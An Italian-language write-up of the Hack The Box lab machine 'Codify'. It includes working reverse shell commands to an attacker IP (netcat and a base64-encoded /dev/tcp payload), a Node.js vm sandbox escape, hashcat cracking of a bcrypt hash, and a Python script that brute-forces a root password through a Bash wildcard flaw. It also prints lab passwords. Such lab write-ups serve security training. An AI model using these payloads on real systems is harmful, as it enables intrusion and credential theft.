---
title: Codify Walkthrough
description: "Codify è una macchina Linux di livello easy che presenta un'applicazione web che consente agli utenti di testare codice Node.js. L'applicazione utilizza una libreria vm2 vulnerabile, che viene sfruttata per ottenere l'esecuzione remota di codice. L'enumerazione del target rivela un database SQLite contenente un hash che, una volta crackato, fornisce accesso SSH alla macchina. Infine, uno script Bash vulnerabile può essere eseguito con privilegi elevati per rivelare la password dell'utente root, portando all'accesso privilegiato alla macchina."
author: dua2z3rr
date: 2025-11-30 1:00:00
categories: [Machines]
tags: ["Area di Interesse: Web Application", "Area di Interesse: Vulnerability Assessment", "Area di Interesse: Databases", "Area di Interesse: Custom Applications", "Area di Interesse: Injections", "Area di Interesse: Source Code Analysis", "Vulnerabilità: Weak Credentials", "Vulnerabilità: Remote Code Execution", "Vulnerabilità: Clear Text Credentials", "Vulnerabilità: Default Credentials", "Vulnerabilità: Misconfiguration", "Codice: Bash", "Codice: JavaScript"]
image: /assets/img/codify/codify-resized.png
---

## Enumerazione Esterna

### nmap

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.11.239 -vv -p- -sC -sV
<SNIP>
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    syn-ack Node.js Express framework
|_http-title: Codify
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Siti

Visito prima la porta 80 dopo aver aggiunto codify.htb negli host. Vengo reindirizzato alla  porta 3000.

![Desktop View](/assets/img/codify/codify-1.png)

Su questo sito possiamo testare il nostro codice Node.js. Possiamo tentare a eseguire codice malevolo sul sito.

![Desktop View](/assets/img/codify/codify-2.png)

Proviamo ad eseguire una semplice reverse shell:

```js
require('child_process').exec('nc -e bash 10.10.16.4 9001')
```

![Desktop View](/assets/img/codify/codify-3.png)

Nel sito sono presenti meccanismi di difesa. Dobbiamo fare a meno di **child_process**. Proviamo con un'altra reverse shell.

![Desktop View](/assets/img/codify/codify-4.png)

Con questo test confermiamo che il controllo non è hardcoded.

### Sandbox Escape

Cercando online, provo varie tipologie di codice.

Scopro che `require("vm");` non è bloccato. Cerco come sfruttarlo e mi imbatto in questo bypass: <https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html>

Testiamolo:

![Desktop View](/assets/img/codify/codify-5.png)

### Spiegazione Bypass

1. Il Punto di Partenza: this

```
this.constructor.constructor('return this.process.env')()
```

In JavaScript, `this` nel contesto globale punta all'oggetto globale. Anche se il codice gira in un nuovo contesto V8, `this` mantiene un riferimento che può essere sfruttato.

2. La Catena di Constructor

```
this → Object instance
this.constructor → Object Constructor (funzione che crea oggetti)
this.constructor.constructor → Function Constructor (funzione che crea funzioni)
```

Il Function Constructor è speciale perché:

Ha accesso allo scope globale del processo Node.js principale
Può creare funzioni a runtime da stringhe
Bypassa le restrizioni del contesto VM

3. Esecuzione Arbitraria

```js
this.constructor.constructor('return this.process')()
```

## Web Shell come svc

### Reverse shell

con questo comando  ottengo una reverse shell sulla porta 9001:

```js
"use strict";
const vm = require("vm");
const xyz = vm.runInNewContext(`const process = this.constructor.constructor('return this.process')();
process.mainModule.require('child_process').execSync('echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi40LzkwMDEgMD4mMQ==" | base64 -d | bash').toString()`);
console.log(xyz);
```

### Enumerazione interna

Nella directory `/var/www/contact` trovo il file `tickets.db`. Provo ad aprirlo localmente.

```shell
svc@codify:/var/www/contact$ ls -al
ls -al
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12  2023 .
drwxr-xr-x 5 root root  4096 Sep 12  2023 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12  2023 tickets.db

svc@codify:/var/www/contact$ python3 -m http.server
python3 -m http.server
10.10.16.4 - - [30/Nov/2025 15:38:00] "GET /tickets.db HTTP/1.1" 200 -
```

Sulla nostra macchina:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $wget http://codify.htb:8000/tickets.db
--2025-11-30 16:38:00--  http://codify.htb:8000/tickets.db
Resolving codify.htb (codify.htb)... 10.10.11.239
Connecting to codify.htb (codify.htb)|10.10.11.239|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 20480 (20K) [application/octet-stream]
Saving to: ‘tickets.db’

tickets.db                                      100%[=====================================================================================================>]  20,00K  --.-KB/s    in 0,08s   

2025-11-30 16:38:00 (251 KB/s) - ‘tickets.db’ saved [20480/20480]

┌─[dua2z3rr@parrot]─[~]
└──╼ $sqlite3 tickets.db 
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
tickets  users  
sqlite> SELECT * FROM users
   ...> ;
3|joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
sqlite>
```

### hashcat

L'hash che abbiamo trovato è un hash bcrypt, identificabile dalla stringa `$2a$`. Crackiamolo

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -m 3200 -a 0 hash.txt rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 3700X 8-Core Processor, 4283/8630 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
Time.Started.....: Sun Nov 30 16:44:16 2025 (58 secs)
Time.Estimated...: Sun Nov 30 16:45:14 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       25 H/s (8.15ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1344/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Candidate.Engine.: Device Generator
Candidates.#1....: teacher -> tagged
Hardware.Mon.#1..: Util: 57%

Started: Sun Nov 30 16:44:09 2025
Stopped: Sun Nov 30 16:45:15 2025
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -m 3200 -a 0 hash.txt rockyou.txt --show
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

La password dell'utente **joshua** è **spongebob1**.

### SSH

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ssh joshua@codify.htb
The authenticity of host 'codify.htb (10.10.11.239)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'codify.htb' (ED25519) to the list of known hosts.
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov 30 03:47:18 PM UTC 2025

  System load:                      0.0048828125
  Usage of /:                       64.0% of 6.50GB
  Memory usage:                     23%
  Swap usage:                       0%
  Processes:                        238
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.10.11.239


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23
joshua@codify:~$
```

Prendiamo la user flag.

## Shell come joshua

### Enumerazione Interna

```shell
joshua@codify:/opt/scripts$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Eseguo linPEAS e scopro che la macchina è vulnerabilie a dirty pipe (CVE-2022-0847), tuttavia non può essere sfruttato.

Trovo questo script nella cartella **/opt/scripts**.

```shell
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

Posso bypassare l'autenticazione usando il carattere `*`.

### Spiegazione

Quando usi le doppie parentesi quadre [[ ]]:

Con virgolette: il lato destro viene trattato come una stringa letterale
Senza virgolette: il lato destro viene trattato come un pattern (glob pattern)

```shell
stringa="hello world"

# Senza virgolette - pattern matching
if [[ $stringa == hello* ]]; then
    echo "Match!"  # Questo stampa "Match!"
fi

# Con virgolette - confronto letterale
if [[ $stringa == "hello*" ]]; then
    echo "Match!"  # Questo NON stampa nulla
fi
```

- Nel primo caso, hello* viene interpretato come pattern (qualsiasi stringa che inizia con "hello"), quindi c'è match.
- Nel secondo caso, "hello*" viene trattato come la stringa letterale "hello*" (con l'asterisco), quindi non c'è match perché la stringa è "hello world" e non "hello*".

### Exploit Script

Dobbiamo fare bruteforce di tutti i caratteri possibili nella password, uno dopo l'altro, tramite wildcard.

Ecco il mio piccolo exploit in python che permette di farlo:

```python
import subprocess

lista = ['q','w','e','r','t','y','u','i','o','p','a','s','d','f','g','h','j','k','l','z','x','c','v','b','n','m','1','2','3','4','5','6','7','8','9','0','!','?','$','%','&','/','(',')','=','-']

passwordCorretta=""
temp=""
ancora=True

while ancora:
	ancora=False
	for i in lista:
		temp=passwordCorretta+i+'*'
		comando=f"echo '{temp}' | sudo /opt/scripts/mysql-backup.sh"
		risultato = subprocess.run(comando, shell=True, capture_output=True, text=True)
		
		if "failed" in risultato.stdout:
			print("carattere " + i +" sbagliato")
		else:
			passwordCorretta=passwordCorretta+i
			print("carattere " + i +" corretto")
			ancora=True
			break

print(passwordCorretta)
```

Lo eseguo:

```text
carattere q sbagliato
carattere w sbagliato
carattere e sbagliato
carattere r sbagliato
<BIG SNIP>
carattere ) sbagliato
carattere = sbagliato
carattere - sbagliato
kljh12k3jhaskjh12kjh3
```

La password di root è **kljh12k3jhaskjh12kjh3**.

```shell
joshua@codify:~$ su root
Password: 
root@codify:/home/joshua#
```

Prendo la root flag e termino la box.
